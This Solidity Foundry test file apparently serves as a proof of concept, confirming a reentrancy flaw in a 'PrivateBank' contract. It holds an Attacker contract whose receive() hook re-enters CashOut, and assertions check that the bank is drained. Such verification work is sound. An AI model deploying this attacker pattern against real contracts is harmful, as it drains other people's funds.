// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import "../src/0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4.sol";

contract ReentrancyTest is Test {
    Log logInstance;
    PrivateBank privateBank;
    Attacker attacker;

    function setUp() public {
        logInstance = new Log();
        privateBank = new PrivateBank(address(logInstance));
        attacker = new Attacker(privateBank);

        vm.deal(address(this), 1 ether);
        privateBank.Deposit{value: 1 ether}();

        vm.deal(address(attacker), 1 ether);
    }

    function testReentrancyAttack() public {
        // Record pre-trigger state
        uint256 initialBankBalance = address(privateBank).balance;
        uint256 initialAttackerBalance = address(attacker).balance;
        uint256 initialAttackerDeposit = privateBank.balances(address(attacker));

        console2.log("--- BEFORE-Trigger Attack ---");
        console2.log("Bank ETH balance: %d", initialBankBalance);
        console2.log("Attacker ETH balance: %d", initialAttackerBalance);
        console2.log("Attacker deposit in bank: %d", initialAttackerDeposit);

        console2.log("--- Trigger Attack ---");
        attacker.attack();

        // Record post-trigger state
        uint256 afterBankBalance = address(privateBank).balance;
        uint256 afterAttackerBalance = address(attacker).balance;
        uint256 afterAttackerDeposit = privateBank.balances(address(attacker));

        console2.log("--- AFTER-Trigger Attack ---");
        console2.log("Bank ETH balance: %d", afterBankBalance);
        console2.log("Attacker ETH balance: %d", afterAttackerBalance);
        console2.log("Attacker deposit in bank: %d", afterAttackerDeposit);

        // Differential verification
        console2.log("--- Differential Verification ---");
        bool bankDrained = (afterBankBalance == 0);
        bool attackerGainValid = (afterAttackerBalance == initialAttackerBalance + 1 ether);
        bool depositUnchanged = (initialAttackerDeposit == afterAttackerDeposit); // Fixed declaration
        
        console2.log("Bank drained? %s", bankDrained ? "YES" : "NO");
        console2.log("Attacker gain valid? %s", attackerGainValid ? "YES" : "NO");
        console2.log("Attacker deposit unchanged? %s", depositUnchanged ? "YES" : "NO");

        // Final vulnerability judgment based on balance changes
        bool vulnerabilityExploited = bankDrained && attackerGainValid;
        
        if (vulnerabilityExploited) {
            console2.log("Vulnerability Exists: Reentrancy attack confirmed by ETH balance changes");
        } else {
            console2.log("Vulnerability not Exist: State changes did not match vulnerability criteria");
        }

        // Existing verification
        assertEq(afterBankBalance, 0, "Bank balance should be 0");
        assertEq(afterAttackerBalance, initialAttackerBalance + 1 ether, "Attacker net gain incorrect");
        assertEq(afterBankBalance, initialBankBalance - 1 ether, "Bank lost only 1 ether, should be drained");
    }
}

contract Attacker {
    PrivateBank private bank;
    uint private reentered;

    constructor(PrivateBank _bank) {
        bank = _bank;
    }

    function attack() external payable {
        bank.Deposit{value: 1 ether}();
        bank.CashOut(1 ether);
    }

    receive() external payable {
        if (reentered < 1) {
            reentered++;
            bank.CashOut(1 ether);
        }
    }
}